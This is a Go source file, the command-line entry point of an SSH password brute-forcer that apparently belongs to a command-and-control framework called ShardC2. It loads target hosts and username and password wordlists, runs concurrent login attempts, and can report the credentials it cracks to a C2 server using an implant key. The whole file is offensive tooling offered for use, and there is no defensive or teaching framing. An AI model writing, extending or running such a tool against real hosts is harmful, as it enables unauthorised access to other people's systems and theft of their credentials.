package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	"github.com/shardc2/shardc2/internal/bruteforcer"
)

func main() {
	var (
		target      = flag.String("target", "", "Single target IP or hostname")
		targetsFile = flag.String("targets-file", "", "File with one target per line")
		port        = flag.Int("port", 22, "SSH port")
		userFile    = flag.String("usernames", "wordlists/usernames.txt", "Username wordlist file")
		passFile    = flag.String("passwords", "wordlists/passwords.txt", "Password wordlist file")
		workers     = flag.Int("workers", 10, "Number of concurrent workers")
		timeout     = flag.Duration("timeout", 5*time.Second, "SSH connection timeout")
		serverURL   = flag.String("server", os.Getenv("SHARDC2_SERVER"), "C2 server URL for reporting (optional)")
		implantKey  = flag.String("implant-key", os.Getenv("SHARDC2_IMPLANT_KEY"), "Implant key for C2 reporting")
	)
	flag.Parse()

	fmt.Println("[*] ShardC2 SSH Bruteforcer")

	var targets []string
	if *target != "" {
		targets = append(targets, *target)
	}
	if *targetsFile != "" {
		t, err := bruteforcer.LoadWordlist(*targetsFile)
		if err != nil {
			log.Fatalf("[-] Failed to load targets: %v", err)
		}
		targets = append(targets, t...)
	}
	if len(targets) == 0 {
		// Also accept targets from remaining args
		for _, arg := range flag.Args() {
			targets = append(targets, strings.TrimSpace(arg))
		}
	}
	if len(targets) == 0 {
		log.Fatal("[-] No targets specified. Use --target, --targets-file, or pass as arguments")
	}

	usernames, err := bruteforcer.LoadWordlist(*userFile)
	if err != nil {
		log.Fatalf("[-] Failed to load usernames: %v", err)
	}
	passwords, err := bruteforcer.LoadWordlist(*passFile)
	if err != nil {
		log.Fatalf("[-] Failed to load passwords: %v", err)
	}

	cfg := bruteforcer.Config{
		Targets:    targets,
		Port:       *port,
		Workers:    *workers,
		Usernames:  usernames,
		Passwords:  passwords,
		Timeout:    *timeout,
		ServerURL:  *serverURL,
		ImplantKey: *implantKey,
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-quit
		log.Println("[*] Stopping brute force...")
		cancel()
	}()

	b := bruteforcer.New(cfg)
	if err := b.Run(ctx); err != nil {
		log.Fatalf("[-] Bruteforcer error: %v", err)
	}
}
